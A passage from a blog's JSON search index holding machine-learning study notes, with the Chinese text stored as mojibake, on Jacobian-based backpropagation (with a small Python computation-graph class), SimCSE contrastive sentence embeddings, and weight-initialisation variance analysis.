é€šè¿‡æ¯”è¾ƒä¸»é¢˜ä¹‹é—´çš„c-TF-IDFå‘é‡ï¼Œåˆå¹¶æœ€ç›¸ä¼¼çš„å‘é‡ï¼Œæœ€åé‡æ–°è®¡ç®—c-TF-IDFå‘é‡æ¥æ›´æ–°ä¸»é¢˜çš„è¡¨ç¤º","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"BERT","slug":"BERT","permalink":"https://racleray.github.io/tags/BERT/"},{"name":"topic model","slug":"topic-model","permalink":"https://racleray.github.io/tags/topic-model/"}]},{"title":"Jacobi BPæ•´ç†","slug":"Jacobi-BPæ•´ç†","date":"2021-06-18T13:54:30.000Z","updated":"2023-08-07T11:54:31.030Z","comments":true,"path":"posts/ff0063e5.html","link":"","permalink":"https://racleray.github.io/posts/ff0063e5.html","excerpt":"ä»Jabobi Matrixè§’åº¦ï¼Œæ¢³ç†ç¥ç»ç½‘ç»œåå‘ä¼ æ’­è¿‡ç¨‹ã€‚","text":"1 æ–¹å‘å¯¼æ•° åœ¨è‡ªå˜é‡ç©ºé—´çš„æŸä¸ªä½ç½®\\(w\\)å¤„ï¼Œé€‰æ‹©ä¸€ä¸ªæ–¹å‘\\(d\\)ï¼ˆå•ä½å‘é‡ï¼‰ï¼Œåœ¨è¯¥æ–¹å‘çš„å€’æ•°ä¸ºï¼š \\[ \\nabla_df(\\mathbf{w})=\\lim_{\\alpha \\to 0}\\frac{f(\\mathbf{w}+\\alpha \\mathbf{d}) - f(\\mathbf{w})}{\\alpha} \\] \\(\\alpha\\)è¶‹äº0æ—¶ï¼Œ\\(\\alpha \\mathbf{d}\\)ä¹Ÿè¶‹äº0ï¼Œå¹³å‡å˜åŒ–ç‡å˜ä¸ºç¬æ—¶å˜åŒ–ç‡ï¼Œå³å¯¼æ•°æ•°ã€‚ \\[ \\nabla_df(\\mathbf{w})=\\lim_{\\alpha \\mathbf{d} \\to 0}\\frac{f(\\mathbf{w}+\\alpha \\mathbf{d}) - f(\\mathbf{w})}{\\alpha \\mathbf{d}} \\] æ–¹å‘å¯¼æ•°å°±æ˜¯å¤šå…ƒå‡½æ•°åœ¨æŸä½ç½®ï¼Œæ²¿ç€æŸæ–¹å‘çš„ç¬æ—¶å˜åŒ–ç‡ã€‚ ä¼˜åŒ–ç›®æ ‡å‡½æ•°ï¼ˆæœ€å°åŒ–ä¸ºä¾‹ï¼‰ï¼Œå°±æ˜¯è¦æ‰¾åˆ°æ–¹å‘å¯¼æ•°ä¸ºè´Ÿæ•°ä¸”æœ€å°çš„æ–¹å‘ï¼Œå‡½æ•°å€¼åœ¨æ­¤æ–¹å‘ä¸‹é™æœ€å¿«ã€‚ ä¸‹é¢å°±æ˜¯ä½¿ç”¨æ¢¯åº¦ï¼Œå¿«é€Ÿæ‰¾åˆ°æ–¹å‘å¯¼æ•°ä¸ºè´Ÿæ•°ä¸”æœ€å°çš„æ–¹å‘ã€‚ å¤šå…ƒå‡½æ•°ï¼Œåˆ†åˆ«ä¼˜åŒ–æ¯ä¸€ä¸ªå…ƒï¼Œæ¯ä¸ªå˜é‡å•ç‹¬åˆ†æå…¶åå¯¼æ•°ã€‚å› ä¸ºè¿åŠ¨æ–¹å‘å¯ä»¥åˆ†è§£ä¸ºå¤šä¸ªåˆ†é‡çš„å’Œã€‚åå¯¼æ•°å½¢å¼ä¸‹çš„å¤šå…ƒå‡½æ•°çš„å‡½æ•°å€¼å˜åŒ–å†™æˆï¼ˆäºŒå…ƒä¸ºä¾‹ï¼‰ï¼š \\[ \\Delta f=\\frac{\\partial f}{\\partial w_1}\\Delta w_1 + \\frac{\\partial f}{\\partial w_2}\\Delta w_2 \\] è¿åŠ¨çš„è·ç¦»ï¼ˆäºŒç»´ï¼‰å˜ä¸ºï¼š \\[ \\sqrt {(\\Delta w_1)^2 + (\\Delta w_2)^2} \\] é‚£ä¹ˆï¼Œå‡½æ•°å€¼åœ¨è¿åŠ¨æ–¹å‘ä¸Šçš„åå¯¼æ•°å°±æ˜¯ï¼š \\[ \\frac {\\frac{\\partial f}{\\partial w_1}\\Delta w_1 + \\frac{\\partial f}{\\partial w_2}\\Delta w_2}{\\sqrt {(\\Delta w_1)^2 + (\\Delta w_2)^2}} = \\begin{pmatrix} \\frac{\\partial f}{\\partial w_1}, \\frac{\\partial f}{\\partial w_2} \\end{pmatrix} \\begin{pmatrix} \\frac{\\Delta w_1}{\\sqrt {(\\Delta w_1)^2 + (\\Delta w_2)^2}} \\\\ \\frac{\\Delta w_2}{\\sqrt {(\\Delta w_1)^2 + (\\Delta w_2)^2}} \\end{pmatrix} \\] å…¶ä¸­ç¬¬ä¸€ä¸ªå‘é‡å°±æ˜¯å‡½æ•°åœ¨\\(\\mathbf{w}\\)å¤„çš„æ¢¯åº¦ï¼Œç¬¬äºŒä¸ªå‘é‡å°±æ˜¯\\(\\Delta \\mathbf{w}\\)çš„å˜åŒ–æ–¹å‘ä¸Šçš„å•ä½å‘é‡ã€‚ æ‰€ä»¥ï¼Œå¤šå…ƒå‡½æ•°çš„æ–¹å‘å¯¼æ•°ï¼Œå°±æ˜¯è¯¥ä½ç½®æ¢¯åº¦ä¸è‡ªå˜é‡å˜åŒ–æ–¹å‘å‘é‡çš„å†…ç§¯ã€‚ä¹Ÿå³ï¼Œæ¢¯åº¦å‘é‡åœ¨è‡ªå˜é‡å˜åŒ–æ–¹å‘å‘é‡ä¸Šçš„æŠ•å½±ã€‚ é‚£ä¹ˆï¼Œæœ€ä¼˜çš„æœ€å°åŒ–æ–¹å‘ä¸ºï¼Œ\\(cos(\\theta)\\)ä¸º-1çš„è‡ªå˜é‡å˜åŒ–æ–¹å‘ã€‚å³è‡ªå˜é‡å˜åŒ–ä¸ºè´Ÿæ¢¯åº¦æ–¹å‘ã€‚ å‚ç›´äºæ¢¯åº¦æ–¹å‘æ—¶ï¼Œå‡½æ•°å€¼ä¸å˜åŒ–ã€‚ å½“ç„¶æ¢¯åº¦ä¸‹é™ï¼Œéœ€è¦è®¾ç½®ä¸€ä¸ªè¾ƒå°çš„å­¦ä¹ ç‡ï¼Œå› ä¸ºï¼Œæ¢¯åº¦åæ˜ çš„æ˜¯å‡½æ•°ç¬æ—¶çš„å˜åŒ–ç‡ï¼Œåªä¿è¯åœ¨å½“å‰ä½ç½®çš„è¾ƒå°é¢†åŸŸå†…çš„å˜åŒ–è§„å¾‹ã€‚ 2 Jacobi æœ‰nç»´å‘é‡ \\(\\mathbf{w}\\)ï¼Œç»è¿‡ä¸€å±‚ç½‘ç»œï¼Œå¾—åˆ° m ç»´ \\(f(\\mathbf w)\\)ã€‚ \\[ \\mathbf f(\\mathbf w)=\\begin{pmatrix} f_1(\\mathbf w) \\\\ f_2(\\mathbf w) \\\\ ... \\\\ f_m(\\mathbf w) \\end{pmatrix} \\] æ¯ä¸€ç»´ä¸ºä¸€ä¸ªæ ‡é‡å‡½æ•°ï¼Œå¯ä»¥å¯¹ nç»´å‘é‡ \\(\\mathbf{w}\\)è¿›è¡Œæ±‚åå¯¼æ“ä½œï¼Œæ±‚å¾—æ¢¯åº¦ã€‚å¾—åˆ° \\[ \\begin{bmatrix} \\frac{\\partial f_1}{\\partial w_1} &amp; ... &amp; \\frac{\\partial f_1}{\\partial w_n} \\\\ ... &amp; ... &amp; ... \\\\ \\frac{\\partial f_m}{\\partial w_1} &amp; ... &amp; \\frac{\\partial f_m}{\\partial w_n} \\end{bmatrix} \\] è¿™å°±æ˜¯å‡½æ•°åœ¨ \\(\\mathbf{w}\\) å¤„çš„Jacobi matrixã€‚æ¯ä¸€è¡Œæ˜¯ \\(\\mathbf f(\\mathbf w)\\)çš„åˆ†é‡åœ¨\\(\\mathbf{w}\\) å¤„çš„æ¢¯åº¦å‘é‡ã€‚ çº¿æ€§è¿‘ä¼¼ï¼ˆç†è§£ä¸ºå‡½æ•°åœ¨æŸä¸€ä½ç½®å¤„çš„ä¸€é˜¶æ³°å‹’å±•å¼€å¹¶å¿½ç•¥é«˜é˜¶æ— ç©·å°ï¼‰çš„è¯¯å·®ï¼Œæ˜¯è‡ªå˜é‡å˜åŒ–å€¼è¶‹äº0æ—¶ï¼Œç›¸å¯¹è‡ªå˜é‡å˜åŒ–å€¼çš„é«˜é˜¶æ— ç©·å°ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œçº¿æ€§è¿‘ä¼¼æ˜¯ç”¨ä¸€ä¸ªé«˜é˜¶çš„å‡½æ•°æ¥è¿‘ä¼¼ä½é˜¶çš„åŸå‡½æ•°ï¼Œè€Œå…¶è¯¯å·®å¯ä»¥è¶‹äºæ— ç©·å°ã€‚ åœ¨å¤šå…ƒå‡½æ•°ä¸­ï¼Œè¿‘ä¼¼å…³ç³»å¯å†™ä¸ºï¼š \\[ \\mathbf f(\\mathbf w) \\approx \\mathbf f(\\mathbf w^*) + \\mathbf J_f(\\mathbf w) \\cdot (\\mathbf w - \\mathbf w^*) \\] Jacobi matrixæ¯ä¸€è¡Œæ˜¯åŸå‡½æ•°ä¸€ä¸ªåˆ†é‡çš„æ¢¯åº¦ï¼Œæ¯ä¸€ç»´åˆ†é‡çš„è¿‘ä¼¼ç»„åˆæˆäº†å¯¹åŸå‡½æ•°æ•´ä½“çš„è¿‘ä¼¼ã€‚ 3 Back propagation with Jacobi è®¡ç®—å›¾ä¸­ï¼Œä¸€å¯¹çˆ¶å­èŠ‚ç‚¹å°±æ˜¯ä¸€ä¸ªå¤šå¯¹å¤šçš„æ˜ å°„ï¼Œéƒ½å¯ä»¥æ±‚ä¸€ä¸ªJacobi matrixã€‚ åœ¨chain ruleä¹‹ä¸‹ï¼Œä¸€ä¸ªå¤åˆæ˜ å°„çš„Jacobiæ˜¯å®¹æ˜“æ±‚çš„ã€‚ \\[ f(g(h(\\mathbf w))) \\] å…¶Jacobiè¡¨ç¤ºä¸º \\(\\mathbf J_f(g(h(\\mathbf w))) \\cdot \\mathbf J_g(h(\\mathbf w)) \\cdot \\mathbf J_h(\\mathbf w)\\)ã€‚å…¶ä¸­è¾“å…¥è¾“å‡ºç»´åº¦æ˜¯ç›¸å¯¹åº”çš„ã€‚ è®¡ç®—å›¾ä¸­ï¼Œæ¯ä¸ªèŠ‚ç‚¹å°†ç»“æœé€šè¿‡ï¼Œå¯¹è‡ªå·±çš„Jacobiï¼ˆå•ä½çŸ©é˜µï¼‰ä¹˜ä¸Šå¯¹çˆ¶èŠ‚ç‚¹çš„Jacobiï¼Œå°†ä¿¡æ¯ä¼ é€’ç»™ä¸Šä¸€å±‚ã€‚ é‚£ä¹ˆæœ€ç»ˆç»“æœå¯¹ä¸€ä¸ªèŠ‚ç‚¹çš„Jacobiï¼Œå¯ä»¥è®¡ç®—ï¼š \\[ \\mathbf J_f = \\sum_s \\mathbf J_{rs} \\mathbf J_{sf} \\] \\(\\mathbf J_{rs}\\)æ˜¯æœ€ç»ˆç»“æœå¯¹sèŠ‚ç‚¹çš„Jacobiï¼ˆè¡¨ç¤ºç´¯è®¡è¯¯å·®BPåˆ°sçš„æ¢¯åº¦ï¼‰ï¼Œ\\(\\mathbf J_{sf}\\)æ˜¯èŠ‚ç‚¹så¯¹fèŠ‚ç‚¹çš„Jacobiã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859class Node(object): \"\"\" è®¡ç®—å›¾èŠ‚ç‚¹åŸºç±» \"\"\" def __init__(self, *parents, **kargs): self.kargs = kargs self.graph = kargs.get('graph', default_graph) self.need_save = kargs.get('need_save', True) self.parents = list(parents) # çˆ¶èŠ‚ç‚¹åˆ—è¡¨ self.children = [] # å­èŠ‚ç‚¹åˆ—è¡¨ self.value = None # æœ¬èŠ‚ç‚¹çš„å€¼ self.jacobi = None # ç»“æœèŠ‚ç‚¹å¯¹æœ¬èŠ‚ç‚¹çš„é›…å¯æ¯”çŸ©é˜µ # å°†æœ¬èŠ‚ç‚¹æ·»åŠ åˆ°çˆ¶èŠ‚ç‚¹çš„å­èŠ‚ç‚¹åˆ—è¡¨ä¸­ for parent in self.parents: parent.children.append(self) # å°†æœ¬èŠ‚ç‚¹æ·»åŠ åˆ°è®¡ç®—å›¾ä¸­ self.graph.add_node(self) ... def forward(self): \"\"\" å‰å‘ä¼ æ’­è®¡ç®—æœ¬èŠ‚ç‚¹çš„å€¼ï¼Œè‹¥çˆ¶èŠ‚ç‚¹çš„å€¼æœªè¢«è®¡ç®—ï¼Œåˆ™é€’å½’è°ƒç”¨çˆ¶èŠ‚ç‚¹çš„forwardæ–¹æ³• \"\"\" for node in self.parents: if node.value is None: node.forward() self.compute() def backward(self, result): \"\"\" åå‘ä¼ æ’­ï¼Œè®¡ç®—ç»“æœèŠ‚ç‚¹å¯¹æœ¬èŠ‚ç‚¹çš„é›…å¯æ¯”çŸ©é˜µ \"\"\" if self.jacobi is None: if self is result: # å¯¹è‡ªå·±çš„Jacobi # self.dimension()è¡¨ç¤ºèŠ‚ç‚¹å€¼å‘é‡çš„ç»´åº¦ self.jacobi = np.mat(np.eye(self.dimension())) else: self.jacobi = np.mat( np.zeros((result.dimension(), self.dimension()))) for child in self.get_children(): if child.value is not None: # ä¸ºNoneæ—¶ï¼Œè¡¨ç¤ºä¸åœ¨å½“å‰è®¡ç®—è·¯å¾„ä¸Š # å³ä¸ºä¸Šæ–‡ä¸­çš„è®¡ç®—å…¬å¼ 10 self.jacobi += child.backward(result) * child.get_jacobi(self) return self.jacobi def dimension(self): \"\"\" è¿”å›æœ¬èŠ‚ç‚¹çš„å€¼å±•å¹³æˆå‘é‡åçš„ç»´æ•° \"\"\" return self.value.shape[0] * self.value.shape[1] ... è°ƒç”¨ç»“æœèŠ‚ç‚¹forworadï¼Œå¾—åˆ°æ‰€æœ‰valueå±æ€§ï¼Œç¼“å­˜åœ¨æ¯ä¸ªèŠ‚ç‚¹ã€‚è°ƒç”¨æŸä¸ªèŠ‚ç‚¹backworadï¼Œå°†è®¡ç®—è¯¥èŠ‚ç‚¹çš„æ¢¯åº¦ä¿å­˜åœ¨jacobiå±æ€§ï¼ˆæ¢¯åº¦çš„è½¬ç½®ï¼Œè‹¥è§„å®šæ¢¯åº¦ä¸ºåˆ—å‘é‡ï¼‰ä¸­ã€‚ åŒæ—¶ï¼Œå®ç°Jacobiçš„ä¹˜æ³•å…³ç³»ä¸‹çš„è®¡ç®—ï¼Œå¯ä»¥è¿›è¡Œæ¨å¯¼ã€‚è¿‡ç¨‹æ¯”è¾ƒç¹çä½†æ˜¯ä¸éš¾ï¼Œç›´æ¥å†™ç»“æœäº†ï¼š çŸ©é˜µ \\(\\mathbf C=\\mathbf A \\mathbf B\\)ï¼ŒAä¸º(m,n)ç»´ï¼ŒBä¸º(n,k)ç»´ã€‚å°†ä¸‰ä¸ªçŸ©é˜µå…¨éƒ¨å±•å¼€ï¼Œæ‹¼æ¥ä¸ºä¸€ä¸ªåˆ—å‘é‡ã€‚ é‚£ä¹ˆCå¯¹Açš„Jacobiä¸ºï¼ˆmk, mnï¼‰ \\[ \\begin{bmatrix} B^T &amp; 0 &amp; ... &amp; 0 \\\\ 0 &amp; B^T &amp; ... &amp; 0 \\\\ ... &amp; ... &amp; ... &amp; ... \\\\ 0 &amp; 0 &amp; ... &amp; B^T \\end{bmatrix} \\] Cå¯¹Bçš„Jacobiä¸ºï¼ˆmk, nkï¼‰çš„ \\[ \\begin{bmatrix} diagonal(a_{1,1}) &amp; diagonal(a_{1,2}) &amp; ... &amp; diagonal(a_{1,n}) \\\\ diagonal(a_{2,1}) &amp; diagonal(a_{2,2}) &amp; ... &amp; diagonal(a_{2,n}) \\\\ ... &amp; ... &amp; ... &amp; ... \\\\ diagonal(a_{m,1}) &amp; diagonal(a_{m,2}) &amp; ... &amp; diagonal(a_{m,n}) \\end{bmatrix} \\] åˆ°æ­¤ï¼ŒåŸºäºJacobiçš„BPè®¡ç®—æ–¹å¼ï¼Œå°±åŸºæœ¬æ²¡æœ‰é—®é¢˜äº†ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"DL","slug":"Notes/DL","permalink":"https://racleray.github.io/categories/Notes/DL/"}],"tags":[{"name":"BP","slug":"BP","permalink":"https://racleray.github.io/tags/BP/"},{"name":"deep learning","slug":"deep-learning","permalink":"https://racleray.github.io/tags/deep-learning/"}]},{"title":"SimCSE-æ–‡æœ¬å¯¹æ¯”å­¦ä¹ ","slug":"SimCSE-æ–‡æœ¬å¯¹æ¯”å­¦ä¹ ","date":"2021-06-15T13:27:06.000Z","updated":"2023-08-07T11:54:31.034Z","comments":true,"path":"posts/9e098b96.html","link":"","permalink":"https://racleray.github.io/posts/9e098b96.html","excerpt":"","text":"æ–‡æœ¬å¯¹æ¯”å­¦ä¹ ä¸åŒäºå›¾åƒçš„ä¸€ç‚¹ï¼Œå°±æ˜¯å¢å¹¿æ–¹å¼ã€‚æ–‡æœ¬éšæœºåˆ é™¤ã€ä¹±åºã€æ›¿æ¢ï¼Œå¥½åƒéƒ½å¯ä»¥ï¼Œä½†æ˜¯æœ‰æ²¡æœ‰é“ç†ï¼Œæ•ˆæœèƒ½æœ‰å¤šå¤§æå‡ï¼Œéƒ½ä¸é‚£ä¹ˆæ¸…æ¥šã€‚è¿™æ–¹é¢ä¹Ÿæ²¡æœ‰æ¯”è¾ƒå…¬è®¤å¤„ç†æ–¹æ³•æµç¨‹ã€‚ è®ºæ–‡ SimCSE (Git)ï¼Œæå‡ºä¸€ç§ç®€å•çš„å¯¹æ¯”å­¦ä¹ æ–¹æ³•ï¼Œç›´æ¥åœ¨BERTç±»æ¨¡å‹ä¹‹ä¸Šï¼Œä½¿ç”¨è®¾è®¡çš„å¯¹æ¯”å­¦ä¹ æŸå¤±è¿›è¡Œfine tuneï¼Œå–å¾—äº†æ¯”è¾ƒå¥½çš„æ•ˆæœã€‚ æ–¹æ³• é¦–å…ˆåœ¨å›¾åƒé¢†åŸŸä½¿ç”¨çš„å¯¹æ¯”å­¦ä¹ æŸå¤±å…¬å¼æ˜¯ æœ¬æ–‡æå‡ºçš„æ–¹æ³•ï¼Œä¸ä½¿ç”¨æ–‡æœ¬å¢å¹¿ç”Ÿæˆå¯¹æ¯”æ ·æœ¬ï¼Œè€Œæ˜¯é€šè¿‡éšæœºDropoutæ¨¡å‹çš„intermediate representationsï¼Œå¾—åˆ°ä¸€ç»„ä¸åŒmaskä¸‹çš„å¯¹æ¯”å­¦ä¹ æ ·ä¾‹ï¼Œä½œä¸ºæ­£æ ·æœ¬ã€‚è€Œä¸æ˜¯æ¥è‡ªåŒä¸€ä¸ªåŸæ–‡æœ¬çš„ intermediate representations ç»„æˆå¤šç»„è´Ÿæ ·æœ¬ã€‚ ä¸¤ä¸ªç»¿åœˆæ­£æ˜¯ä¸åŒdropoutä¸‹çš„ä¸€ç»„æ­£æ ·æœ¬ã€‚æ€è·¯ç¡®å®æŒºç®€å•çš„ï¼Œä½†æ˜¯åˆ«äººåšå‡ºæ¥äº†ï¼Œè¿˜æ•´ç†å¾—æœ‰æ¡ç†ã€‚å”‰ï¼Œæˆ‘åˆæå¾—äº†ä»€ä¹ˆé¬¼è´¡çŒ®å‘¢ã€‚ è®ºæ–‡ç»“æœï¼Œåœ¨å–0.1 dropout rateæ—¶ï¼Œæ— ç›‘ç£å¥å­å‘é‡çš„æ•ˆæœæœ€å¥½ã€‚STS-Bä»»åŠ¡çš„Spearman`s correlation è¾¾åˆ° 79.1ã€‚ è®ºæ–‡è¿˜åœ¨æœ‰ç›‘ç£æ¡ä»¶ä¸‹ï¼Œè¿›ç¨‹äº†å®éªŒã€‚åœ¨NLIæ•°æ®é›†ä¸Šï¼ŒåŠ å…¥ä¸¤ä¸ªæºæ–‡æœ¬ åŒä¹‰(entailment)ã€ä¸­ç«‹(neutral)ã€åä¹‰(contradiction) ä¸‰ç§æƒ…å†µçš„ç›‘ç£ä¿¡æ¯ã€‚ æ­£ä¾‹æ¥è‡ªåŒä¹‰çš„å¥å­å¯¹ï¼Œè´Ÿä¾‹æ¥è‡ªä¸åŒå«ä¹‰çš„å¥å­ã€‚åŒæ—¶ä½¿ç”¨ä¸¥æ ¼åä¹‰çš„å¥å­å¯¹ä½œä¸ºè´Ÿä¾‹æ—¶ï¼Œæ•ˆæœä¼šæœ‰æå‡ã€‚ è¿™é‡Œæ²¡æœ‰ä½¿ç”¨ä¸åŒdropoutï¼Œæ¯•ç«Ÿå·²ç»æœ‰æ­£è´Ÿæ ·æœ¬æ ‡ç­¾äº†ã€‚ä½œè€…ä¹Ÿåšäº†å®éªŒï¼Œä½¿ç”¨dropoutå¢å¹¿å¹¶æ²¡æœ‰å¸¦æ¥æå‡ã€‚ å¯¹æ¯”å­¦ä¹ æ•ˆæœè¯„ä»· åœ¨çœ‹Bert Flowæ—¶ï¼Œäº†è§£åˆ°å‘é‡è¡¨ç¤ºçš„å„å‘å¼‚æ€§å¾ˆé‡è¦ï¼Œå°¤å…¶åœ¨è¯­ä¹‰ç›¸ä¼¼æ€§ä»»åŠ¡ä¸­ï¼Œå¯¹ç›¸ä¼¼æ€§æŒ‡æ ‡å½±å“å¾ˆå¤§ã€‚å¦å¤–ï¼Œç›´è§‰æ¥è®²ï¼Œå¯¹æ¯”å­¦ä¹ ç›®çš„å°±æ˜¯å°†åŒç±»ç›¸ä¼¼çš„èšåœ¨ä¸€èµ·ï¼ŒåŒæ—¶å°†å‘é‡åˆ†å¸ƒå°½é‡ä¿æŒå‡åŒ€ï¼Œä»¥ä¿ç•™æ›´å¯èƒ½å¤šçš„ä¿¡æ¯ã€‚ å¥½çš„å­¦ä¹ æ•ˆæœï¼Œåº”è¯¥ä¿è¯ ç»“æœçš„å¯¹é½æ€§å’Œå‡åŒ€æ€§(Alignment and uniformity)ã€‚åŸè®ºæ–‡æ¨å¯¼è¾ƒå¤šï¼Œç»“è®ºå°±æ˜¯ï¼Œå¯¹æ¯”å­¦ä¹ çš„æŸå¤±ï¼Œå¯ä»¥è½¬æ¢ä¸ºå¯¹é½æŸå¤±å’Œå‡åŒ€æŸå¤±ä¹‹å’Œã€‚è¿‡ç¨‹æŒºå¤æ‚çš„ï¼Œè¿™é‡Œå¹¶ä¸å…³å¿ƒ(æŒºéº»çƒ¦çš„)ã€‚ è®ºæ–‡ç»™å‡ºäº†ä»£ç ï¼š æ³¨æ„ï¼Œä»¥ä¸Šè®¡ç®—ä¸­çš„xå’Œyéƒ½æ˜¯ç»è¿‡ L2 normalize çš„å‘é‡ã€‚ åŸè®ºæ–‡åšäº†å¾ˆå¤šå®éªŒï¼Œå‘ç°è¦åŒæ—¶å°†å¯¹é½æŸå¤±å’Œå‡åŒ€æŸå¤±è¾¾åˆ°æœ€ä¼˜ï¼Œå¾ˆéš¾ï¼Œè‡³å°‘åœ¨ä½œè€…çš„å®éªŒä¸­ï¼Œæ˜¯è¾¾ä¸åˆ°çš„ã€‚ SimCSEä¸­ï¼Œå°†è¿™ä¸¤ä¸ªæŸå¤±ï¼Œä½œä¸ºmetricsä½¿ç”¨ï¼Œè¯„ä»·sentence embeddingçš„å¯¹æ¯”å­¦ä¹ æ•ˆæœã€‚ä¸¤ä¸ªæŒ‡æ ‡ï¼Œéƒ½æ˜¯å°½é‡å°æ›´å¥½ï¼Œä½†æ˜¯å¾ˆéš¾ä¿è¯åŒæ—¶æœ€ä¼˜ã€‚ ç»éªŒ æ— ç›‘ç£å¥å‘é‡è®­ç»ƒï¼Œåªä½¿ç”¨éšæœºDropoutï¼Œå¾—åˆ°ä¸¤ä¸ªrepresentations ä½œä¸ºæ­£ä¾‹ï¼Œæ¯”åœ¨æºæ–‡æœ¬ä¸Šè¿›è¡Œéšæœºåˆ é™¤æ›¿æ¢ç­‰æ“ä½œçš„æ•ˆæœæ›´å¥½ã€‚ æœ‰ç›‘ç£æ¡ä»¶ä¸‹ï¼Œä¸éœ€è¦éšæœºDropoutç”Ÿæˆæ ·æœ¬è¡¨è¾¾ï¼Œåˆ©ç”¨ç›‘ç£ä¿¡æ¯å°±èƒ½å¾—åˆ°å¾ˆå¥½çš„å­¦ä¹ æ•ˆæœã€‚ è®­ç»ƒBERT baseæ—¶ï¼Œä½¿ç”¨256æˆ–è€…512 batch sizeæ•ˆæœç›¸å¯¹è¾ƒå¥½ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"sentence embedding","slug":"sentence-embedding","permalink":"https://racleray.github.io/tags/sentence-embedding/"},{"name":"SimCSE","slug":"SimCSE","permalink":"https://racleray.github.io/tags/SimCSE/"}]},{"title":"å›é¡¾ç¥ç»ç½‘ç»œåˆå§‹åŒ–æ–¹æ³•","slug":"å›é¡¾ç¥ç»ç½‘ç»œåˆå§‹åŒ–æ–¹æ³•","date":"2021-06-14T15:51:41.000Z","updated":"2023-08-07T11:54:31.040Z","comments":true,"path":"posts/1498e8ac.html","link":"","permalink":"https://racleray.github.io/posts/1498e8ac.html","excerpt":"","text":"é‚£ä¹ˆé¦–å…ˆæˆ‘ä»¬å·²ç»çŸ¥é“ï¼Œå…¨0æˆ–è€…å¸¸æ•°ã€è¿‡å¤§ã€è¿‡å°çš„æƒé‡åˆå§‹åŒ–éƒ½æœ‰æ¢¯åº¦æ¶ˆå¤±æˆ–è€…æ¢¯åº¦çˆ†ç‚¸çš„é—®é¢˜ã€‚è€Œæˆ‘ä»¬æ‰€æœŸæœ›çš„åˆå§‹åŒ–çŠ¶æ€æ˜¯ï¼šæœŸæœ›ä¸º0ï¼Œæ–¹å·®åœ¨ä¸€å®šèŒƒå›´å†…ï¼ŒåŒæ—¶å°½é‡ä¿è¯ä¸åŒå±‚çš„æƒé‡æ–¹å·®çš„ä¸€è‡´æ€§ã€‚è¿™æ ·å‡ºç°internal covariance shiftçš„å¯èƒ½æ€§ä¼šå¤§å¹…é™ä½ã€‚é—²æ¥æ— äº‹ï¼Œé€‚å·§åº·åº·ã€‚ ä¸ºäº†æ›´ç®€æ´çš„æœŸæœ›ä¸æ–¹å·® é¦–å…ˆéœ€è¦çŸ¥é“æœŸæœ›\\(E\\)å’Œæ–¹å·®\\(Var\\)çš„è®¡ç®—æ–¹æ³•ï¼ŒåŸºæœ¬å…¬å¼ï¼š \\[ Var(X)=E(X^2)-(E(X))^2 \\] \\[ Covariance(X,Y)=E((X-E(X))(Y-E(Y)))\\\\ =E(XY)-E(X)E(Y) \\] å½“Xï¼ŒYä¸ºç‹¬ç«‹çš„éšæœºå˜é‡ï¼ŒCorvariance(å³Cov)ä¸º0ã€‚ å¯ä»¥è¡¨ç¤ºå‡ºä¸¤ä¸ªç‹¬ç«‹éšæœºå˜é‡çš„å’Œçš„æ–¹å·®ï¼š \\[ Var(X+Y)=E((X+Y)^2)-(E(X+Y))^2\\\\ =E(X^2+Y^2+2XY)-(E(X)+E(Y))^2\\\\ =E(X^2)-(E(X))^2+E(Y^2)-(E(Y))^2\\\\ =Var(X)+Var(Y) \\] ä¸¤ä¸ªç‹¬ç«‹éšæœºå˜é‡çš„ç§¯çš„æ–¹å·®ï¼š \\[ Var(XY)=E((XY)^2)-(E(XY))^2\\\\ =E(X^2)E(Y^2)-(E(X)E(Y))^2\\\\ =(Var(X)+E(X)^2)(Var(Y)+E(Y)^2)-(E(X)E(Y))^2\\\\ =Var(X)Var(Y)+E(X)^2Var(Y)+Var(X)E(Y)^2 \\] ç¥ç»ç½‘ç»œè®¡ç®—è¿‡ç¨‹ä¸€èˆ¬æ€§è¡¨è¾¾ åŸºæœ¬çš„è®¡ç®—æ–¹å¼ï¼š \\[ Z_l=WA_{l-1}+B\\\\ A_l=f(Z_l) \\] Wä¸Aæ˜¯ç›¸äº’ç‹¬ç«‹çš„ã€‚æ¯ä¸€å±‚ä¸åŒç¥ç»å…ƒçš„æƒé‡\\(w_i\\)æ˜¯ç‹¬ç«‹åŒåˆ†å¸ƒçš„ã€‚ å‡å¦‚Wä¸Açš„åˆ†å¸ƒå·²çŸ¥ï¼Œé‚£ä¹ˆZçš„æ–¹å·®å¯ä»¥è®¡ç®—ï¼š \\[ Var(z)=Var(\\sum_{i}^{fan\\_in} w_ia_i)\\\\ =fan\\_in \\times (Var(w)Var(a)+E(w)^2Var(a)+Var(w)E(a)^2) \\] fan_inè¡¨ç¤ºè¾“å…¥å•å…ƒä¸ªæ•°ï¼Œæ¯ä¸ªè¾“å…¥å•å…ƒçš„æ¿€æ´»å€¼ä¸å¯¹åº”çš„æƒé‡ç›¸ä¹˜æ±‚å’Œï¼Œå¾—åˆ°å½“å‰å±‚çš„æ¿€æ´»å€¼ã€‚ç‹¬ç«‹åŒåˆ†å¸ƒï¼Œæ‰€ä»¥å’Œçš„æ–¹å·®å¯ä»¥ç®€åŒ–ä¸ºæ–¹å·®ä¹‹å’Œã€‚ ä¸åŒæ¿€æ´»å‡½æ•°çš„å½±å“ åˆå§‹åŒ–çš„ç›®çš„å§‹ç»ˆæ˜¯é¿å…æ¢¯åº¦çˆ†ç‚¸æˆ–è€…æ¶ˆå¤±ï¼Œæœ€å¥½å¯ä»¥åŠ å¿«æ”¶æ•›é€Ÿåº¦ã€‚é‚£ä¹ˆåœ¨åˆ†ææ•´ä¸ªç½‘ç»œçš„å‚æ•°é€å±‚å˜åŒ–æ—¶ï¼Œéœ€è¦åˆ†æä¸€èˆ¬æ€§çš„å˜åŒ–è§„å¾‹ã€‚ 